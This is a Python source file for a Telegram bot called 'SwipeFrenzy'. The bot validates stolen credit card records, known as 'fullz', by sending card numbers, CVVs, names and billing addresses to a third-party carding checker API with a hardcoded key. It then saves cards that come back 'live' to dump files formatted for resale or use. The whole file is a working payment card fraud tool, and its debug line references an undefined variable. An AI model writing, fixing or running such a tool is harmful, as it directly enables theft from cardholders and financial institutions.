import telebot
import requests
import datetime
import random
import os
from telebot import types

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    TOKEN = input("Enter your Telegram Bot Token: ")

bot = telebot.TeleBot(TOKEN)
user_data = {}

API_KEY = "e243b2046e7cfeef3b9e8c28e9897d87"
USERNAME = "EscoCCs"
BASE_URL = "https://mirror1.luxchecker.vc/apiv2/"
CHECK_TYPE = "avk.php"

# ==================== CHECK FUNCTION ====================
def check_card(parts):
    if len(parts) < 11:
        return {"status": "error", "msg": "Not enough fields. Need 12 parts separated by |"}

    try:
        payload = {
            "cardnum": parts[0].strip(),
            "expm": parts[1].strip(),
            "expy": parts[2].strip(),
            "cvv": parts[3].strip(),
            "fname": parts[4].strip(),
            "lname": parts[5].strip(),
            "address": parts[6].strip(),
            "city": parts[7].strip(),
            "state": parts[8].strip(),
            "zip": parts[9].strip(),
            "country": parts[10].strip(),
            "key": API_KEY,
            "username": USERNAME
        }

        r = requests.get(BASE_URL + CHECK_TYPE, params=payload, timeout=15)
        response = r.json()

        # === DEBUG: Send full API response to user ===
        bot.send_message(message.chat.id, f"🔧 Debug Response:\n```{response}```", parse_mode='Markdown')

        if response.get("error"):
            return {"status": "error", "msg": response.get("error") or "Unknown error from API"}

        if response.get("result") == 1:
            return {
                "status": "live",
                "data": {
                    "card": parts[0].strip(),
                    "exp": f"{parts[1].strip()}/{parts[2].strip()}",
                    "cvv": parts[3].strip(),
                    "name": f"{parts[4].strip()} {parts[5].strip()}",
                    "bank": "Unknown",
                    "country": f"{parts[10].strip()} • Mastercard",
                    "address": f"{parts[6].strip()}, {parts[7].strip()}, {parts[8].strip()} {parts[9].strip()}",
                    "phone": "N/A",
                    "email": parts[11].strip() if len(parts) > 11 else "N/A",
                    "ip": parts[12].strip() if len(parts) > 12 else "N/A",
                    "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            }
        return {"status": "dead"}
        
    except Exception as e:
        return {"status": "error", "msg": str(e)}

def format_live_card(info):
    return f"""
══════════════════════════════════════
👤 Name : {info['name']}
💳 Card : {info['card']}
📅 Expiry : {info['exp']}
🔒 CVV : {info['cvv']}
🏦 Bank : {info['bank']}
🌍 Country : {info['country']}
📍 Billing Address: {info['address']}
📞 Phone : {info['phone']}
✉️ Email : {info['email']}
🌐 IP : {info['ip']}
🕒 Checked : {info['time']}
══════════════════════════════════════
""".strip()

# ==================== COMMANDS ====================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('/check', '/tester')
    bot.reply_to(message, "👋 **SwipeFrenzy** Bot Ready.\nUse /check or /tester", parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['check'])
def cmd_check(message):
    user_id = message.chat.id
    user_data[user_id] = {"mode": "check", "target": 0, "lives": []}
    bot.reply_to(message, "How many live cards do you need?")

@bot.message_handler(commands=['tester'])
def cmd_tester(message):
    user_id = message.chat.id
    user_data[user_id] = {"mode": "tester"}
    bot.reply_to(message, "🧪 Tester Mode ON.\nSend one full card.")

@bot.message_handler(func=lambda m: True)
def handle(message):
    user_id = message.chat.id
    text = message.text.strip()

    if user_id not in user_data:
        bot.reply_to(message, "Use /start first.")
        return

    data = user_data[user_id]

    # Set target
    if data["mode"] == "check" and data["target"] == 0:
        try:
            data["target"] = int(text)
            bot.reply_to(message, f"Target set to {data['target']}. Now send cards.")
            return
        except:
            bot.reply_to(message, "Please send a number.")
            return

    # Process card
    parts = [x.strip() for x in text.split("|")]
    result = check_card(parts)

    if result["status"] == "error":
        bot.reply_to(message, f"❌ Error: {result.get('msg')}")
    elif result["status"] == "live":
        if data["mode"] == "tester":
            filename = f"tester{random.randint(1000,9999)}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(format_live_card(result["data"]))
            bot.reply_to(message, f"✅ LIVE! Saved to `{filename}`", parse_mode='Markdown')
            del user_data[user_id]
        else:
            data["lives"].append(result["data"])
            bot.reply_to(message, f"✅ LIVE ({len(data['lives'])}/{data['target']})")
            if len(data["lives"]) >= data["target"]:
                with open("lives.txt", "a", encoding="utf-8") as f:
                    for card in data["lives"]:
                        f.write(format_live_card(card) + "\n\n")
                bot.reply_to(message, "🎯 Target completed. Saved to lives.txt")
                del user_data[user_id]
    else:
        bot.reply_to(message, "❌ Dead")

print("Bot Started...")
bot.infinity_polling()
